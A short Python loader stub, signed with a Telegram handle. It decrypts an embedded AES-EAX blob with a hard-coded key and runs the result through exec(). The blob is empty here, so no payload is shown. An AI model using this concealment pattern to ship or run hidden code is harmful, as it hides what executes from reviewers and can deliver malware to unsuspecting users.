# Telegram: @rafi_broh


import base64
from Crypto.Cipher import AES

def decrypt_data(data, key):
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)


encrypted_data = base64.b64decode("")


aes_key = b'\xf1\x8c\xf3\x8c\xbe\x13I\xca\xb2\x9ct_#\x0ei\xf8'


exec(decrypt_data(encrypted_data, aes_key))
